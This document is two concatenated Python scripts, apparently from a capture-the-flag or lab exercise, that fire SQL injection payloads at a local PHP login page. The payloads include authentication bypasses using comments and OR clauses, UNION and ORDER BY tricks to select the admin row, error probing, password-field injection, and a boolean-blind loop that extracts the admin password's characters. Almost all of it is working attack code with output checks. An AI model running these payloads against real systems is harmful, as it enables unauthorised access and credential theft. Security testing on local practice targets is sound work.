import requests

url = "http://127.0.0.1:32960/index.php"

print("=== Careful Analysis of Response Patterns ===\n")

# Baseline: NO h3 message (no parameters)
resp_no_params = requests.get(url)
print(f"[No params]           Length: {len(resp_no_params.text)} | Has h3: {'<h3>' in resp_no_params.text}")

# Baseline: h3 message (any parameters including SQLi)
resp_sqli = requests.get(url, params={'username': "admin' OR '1'='1", 'password': 'x'})
print(f"[SQLi payload]        Length: {len(resp_sqli.text)} | Has h3: {'<h3>' in resp_sqli.text}")

# The h3 message is the indicator
# No h3 = not authenticated
# Has h3 with 'not admin' = authenticated but wrong user
# The goal: Has h3 WITHOUT 'not admin' message (success!)

print("\n=== Testing Payloads That Specifically Select Admin ===\n")

# Try to return only admin row
admin_specific = [
    ("' UNION SELECT * FROM users WHERE username='admin' --", "any"),
    ("admin' LIMIT 1 --", "any"),
    ("admin' ORDER BY username LIMIT 1 --", "any"),
]

print("Testing admin-specific selection:")
for user, pwd in admin_specific:
    try:
        resp = requests.get(url, params={'username': user, 'password': pwd})
        has_h3 = '<h3>' in resp.text
        is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
        print(f"  '{user[:50]}'")
        print(f"    Has h3: {has_h3} | 'Not admin' msg: {is_not_admin} | Length: {len(resp.text)}")
        if has_h3 and not is_not_admin:
            print(f"    [!] SUCCESS! Response:\n{resp.text}")
    except Exception as e:
        print(f"  Error: {e}")

print("\n=== Testing Comment Variations for Password Bypass ===\n")

# In PHP/MySQL: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
# To bypass: admin' --  (comments out password check)
comment_payloads = [
    ("admin' --", "anything"),
    ("admin' #", "anything"),
    ("admin'--", "anything"),
    ("admin'#", "anything"),
    ("admin' /*", "anything"),
    ("admin'-- -", "anything"),
    ("admin' -- -", "anything"),
]

print("Testing comment-based bypass:")
for user, pwd in comment_payloads:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_h3 = '<h3>' in resp.text
    is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
    print(f"  '{user}' | Has h3: {has_h3} | Not admin: {is_not_admin}")
    if has_h3 and not is_not_admin:
        print(f"    [!] SUCCESS!\n{resp.text}")

print("\n=== Testing Error-based Detection ===")

# Try to cause syntax errors to understand query structure
error_payloads = [
    "'",  # Single quote
    "''", # Two quotes
    "' OR 1", # Incomplete OR
    "admin'", # Truncated
    "1' AND 1=1", # Mixed
]

print("Testing error patterns:")
for payload in error_payloads:
    resp = requests.get(url, params={'username': payload, 'password': 'x'})
    has_h3 = '<h3>' in resp.text
    has_error = 'error' in resp.text.lower()
    print(f"  '{payload}' | Has h3: {has_h3} | Has error: {has_error} | Len: {len(resp.text)}")

import requests

url = "http://127.0.0.1:32960/index.php"

print("=== Testing ORDER BY to Prioritize Admin ===\n")

# If SQLi returns multiple rows, try to get admin first
order_payloads = [
    # Order to put admin first
    ("' OR 1=1 ORDER BY username='admin' DESC --", "any"),
    ("' UNION SELECT * FROM users WHERE username='admin' ORDER BY 1 --", "any"),
    ("admin' UNION SELECT * FROM users WHERE username != 'admin' --", "any"),
    ("' OR username='admin' ORDER BY 1 --", "any"),
    
    # Try GROUP BY
    ("' OR 1=1 GROUP BY username HAVING username='admin' --", "any"),
]

for user, pwd in order_payloads:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_h3 = '<h3>' in resp.text
    is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
    has_success = has_h3 and not is_not_admin
    print(f"Payload: '{user[:50]}'")
    print(f"  Has h3: {has_h3} | Not admin: {is_not_admin} | SUCCESS: {has_success}")
    if has_success:
        print(f"  [!] FULL RESPONSE:\n{resp.text}")
    print()

print("\n=== Testing with Subqueries ===\n")

subquery_payloads = [
    ("' OR EXISTS(SELECT * FROM users WHERE username='admin') --", "any"),
    ("admin' AND EXISTS(SELECT 1) --", "any"),
    ("' OR (SELECT username FROM users LIMIT 1)='admin' --", "any"),
]

for user, pwd in subquery_payloads:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_h3 = '<h3>' in resp.text
    is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
    has_success = has_h3 and not is_not_admin
    print(f"Payload: '{user[:50]}'")
    print(f"  SUCCESS: {has_success}")
    if has_success:
        print(f"  [!] FULL RESPONSE:\n{resp.text}")
    print()

print("\n=== Testing Alternative Injection Points ===\n")

# Try injecting in password field more aggressively
pwd_inject_payloads = [
    ("admin", "' OR username='admin"),
    ("admin", "' AND username='admin"),
    ("admin", "' LIKE 'admin"),
    ("admin", "%' OR '1'='1"),  # Wildcard
    ("admin", "' OR 1 LIMIT 1 --"),
]

for user, pwd in pwd_inject_payloads:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_h3 = '<h3>' in resp.text
    is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
    has_success = has_h3 and not is_not_admin
    print(f"User: '{user}' Pass: '{pwd[:40]}'")
    print(f"  SUCCESS: {has_success}")
    if has_success:
        print(f"  [!] FULL RESPONSE:\n{resp.text}")
    print()

print("\n=== Trying to Guess Admin Password with SQLi ===\n")

# If we can do boolean-based blind, try to guess password
password_chars = []
for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
    # Check if password contains char
    payload = f"admin' AND password LIKE '%{char}%' --"
    resp = requests.get(url, params={'username': payload, 'password': 'x'})
    has_h3 = '<h3>' in resp.text
    is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
    if has_h3 and not is_not_admin:
        password_chars.append(char)
        print(f"  Password contains: '{char}'")
    else:
        print(f"  Password does NOT contain: '{char}'")

print(f"\nPassword character set: {password_chars}")

